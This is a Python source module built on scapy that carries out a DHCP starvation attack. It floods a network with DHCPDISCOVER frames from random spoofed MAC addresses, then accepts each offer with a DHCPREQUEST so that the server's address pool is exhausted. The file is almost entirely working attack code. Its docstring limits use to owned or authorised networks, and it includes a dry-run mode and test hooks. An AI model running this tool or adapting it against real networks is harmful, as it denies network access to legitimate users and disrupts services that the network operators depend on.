"""DHCP starvation: exhausts the server's address pool.

For each DHCPDISCOVER sent with a random MAC address, the attacker listens
for the DHCPOFFER and completes the handshake with a DHCPREQUEST. The server
then records a lease, so the pool is consumed.

Intended only for networks you own or are explicitly authorized to test.
"""

from __future__ import annotations

import random
import threading
import time
from collections.abc import Callable
from dataclasses import dataclass, replace
from typing import Any

from scapy.all import BOOTP, DHCP, UDP, IP, AsyncSniffer, Ether, sendp
from scapy.packet import Packet

BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"
CLIENT_PORT = 68
SERVER_PORT = 67
GRACE_PERIOD = 10.0         # max seconds to wait for late OFFERs after the last frame
MAX_PENDING = 10_000        # cap on outstanding DISCOVERs kept in memory


@dataclass(frozen=True)
class DhcpStarvationConfig:
    iface: str
    count: int = 0            # DISCOVER frames to send; 0 = run until stopped
    interval: float = 0.05    # seconds between DISCOVER frames
    request: bool = True      # answer each OFFER with a REQUEST (creates leases)
    dry_run: bool = False     # build frames but do not send them


@dataclass
class StarvationStats:
    discovers: int = 0
    offers: int = 0
    requests: int = 0


@dataclass(frozen=True)
class Offer:
    xid: int
    mac: str
    yiaddr: str
    server_id: str


def random_mac(rng: random.Random) -> str:
    """Random unicast, locally administered MAC address (LAA bit set)."""
    octets = [rng.randrange(256) for _ in range(6)]
    octets[0] = (octets[0] & 0xFE) | 0x02
    return ":".join(f"{o:02x}" for o in octets)


def _chaddr_to_mac(chaddr: bytes) -> str:
    return ":".join(f"{b:02x}" for b in chaddr[:6])


def _dhcp_option(packet: Packet, name: str) -> Any:
    """Return the value of a DHCP option, or None if absent.

    Scapy stores options as (name, value) tuples, but some entries such as
    'end' or 'pad' are plain strings, and some options have more than two
    elements. Skip anything that is not a simple pair.
    """
    for option in packet[DHCP].options:
        if isinstance(option, tuple) and len(option) == 2 and option[0] == name:
            return option[1]
    return None


def build_discover(mac: str, xid: int) -> Packet:
    """Build a complete DHCPDISCOVER for the given MAC address."""
    chaddr = bytes.fromhex(mac.replace(":", "")).ljust(16, b"\x00")
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / BOOTP(chaddr=chaddr, xid=xid, flags=0x8000)
        / DHCP(options=[("message-type", "discover"), "end"])
    )


def build_request(mac: str, xid: int, requested_ip: str, server_id: str) -> Packet:
    """Build a DHCPREQUEST accepting the address offered by `server_id`."""
    chaddr = bytes.fromhex(mac.replace(":", "")).ljust(16, b"\x00")
    return (
        Ether(src=mac, dst=BROADCAST_MAC)
        / IP(src="0.0.0.0", dst="255.255.255.255")
        / UDP(sport=CLIENT_PORT, dport=SERVER_PORT)
        / BOOTP(chaddr=chaddr, xid=xid, flags=0x8000)
        / DHCP(
            options=[
                ("message-type", "request"),
                ("requested_addr", requested_ip),
                ("server_id", server_id),
                "end",
            ]
        )
    )


# Scapy builds packets with message-type names, but dissected packets carry the
# RFC 2132 numeric value. Accept both forms.
_MESSAGE_TYPE_NAMES = {1: "discover", 2: "offer", 3: "request", 5: "ack"}


def _message_type(packet: Packet) -> str | None:
    value = _dhcp_option(packet, "message-type")
    if isinstance(value, int):
        return _MESSAGE_TYPE_NAMES.get(value)
    return value


def parse_offer(packet: Packet) -> Offer | None:
    """Return an Offer if the packet is a DHCPOFFER, otherwise None."""
    if not (packet.haslayer(DHCP) and packet.haslayer(BOOTP)):
        return None
    if _message_type(packet) != "offer":
        return None
    server_id = _dhcp_option(packet, "server_id")
    if server_id is None:
        return None
    bootp = packet[BOOTP]
    return Offer(
        xid=bootp.xid,
        mac=_chaddr_to_mac(bootp.chaddr),
        yiaddr=bootp.yiaddr,
        server_id=server_id,
    )


class OfferCollector:
    """Sniffs DHCPOFFER messages in the background on one interface."""

    def __init__(self, iface: str) -> None:
        self._lock = threading.Lock()
        self._offers: list[Offer] = []
        # No BPF filter: it would need libpcap at runtime. parse_offer() does the
        # filtering in Python, which is enough for the lab and small networks.
        self._sniffer = AsyncSniffer(iface=iface, store=False, prn=self._on_packet)

    def start(self) -> None:
        self._sniffer.start()

    def stop(self) -> None:
        self._sniffer.stop()

    def take(self) -> list[Offer]:
        """Return and clear the offers received so far."""
        with self._lock:
            offers, self._offers = self._offers, []
        return offers

    def _on_packet(self, packet: Packet) -> None:
        offer = parse_offer(packet)
        if offer is not None:
            with self._lock:
                self._offers.append(offer)


def _answer_offers(
    collector: Any,
    pending: dict[int, str],
    config: DhcpStarvationConfig,
    send: Callable[..., Any],
    stats: StarvationStats,
) -> None:
    """Send a REQUEST for every OFFER that answers one of our DISCOVERs."""
    for offer in collector.take():
        mac = pending.get(offer.xid)
        if mac is None or mac != offer.mac:
            continue
        stats.offers += 1
        del pending[offer.xid]
        send(
            build_request(mac, offer.xid, offer.yiaddr, offer.server_id),
            iface=config.iface,
            verbose=False,
        )
        stats.requests += 1


def run_starvation(
    config: DhcpStarvationConfig,
    stop_event: threading.Event,
    on_progress: Callable[[StarvationStats], None],
    rng: random.Random | None = None,
    send: Callable[..., Any] | None = None,
    collector_factory: Callable[[str], Any] = OfferCollector,
) -> StarvationStats:
    """Run the attack until `count` DISCOVERs are sent or `stop_event` is set.

    `send` and `collector_factory` are injectable for testing; by default they
    are scapy's sendp and the live OfferCollector.
    """
    rng = rng or random.Random()
    send = send or sendp
    stats = StarvationStats()
    pending: dict[int, str] = {}   # xid -> MAC of our outstanding DISCOVER
    live = config.request and not config.dry_run
    collector = collector_factory(config.iface) if live else None
    if collector is not None:
        collector.start()

    try:
        while not stop_event.is_set() and (config.count == 0 or stats.discovers < config.count):
            mac = random_mac(rng)
            xid = rng.getrandbits(32)
            if not config.dry_run:
                send(build_discover(mac, xid), iface=config.iface, verbose=False)
            stats.discovers += 1
            pending[xid] = mac
            if len(pending) > MAX_PENDING:
                pending.pop(next(iter(pending)))

            if collector is not None:
                _answer_offers(collector, pending, config, send, stats)
            on_progress(replace(stats))
            stop_event.wait(config.interval)

        if collector is not None:
            # Servers can answer seconds later (for example after an ARP check),
            # so keep answering OFFERs until all are handled or time runs out.
            deadline = time.monotonic() + GRACE_PERIOD
            while pending and time.monotonic() < deadline:
                time.sleep(0.25)
                _answer_offers(collector, pending, config, send, stats)
            on_progress(replace(stats))
    finally:
        if collector is not None:
            collector.stop()

    return stats
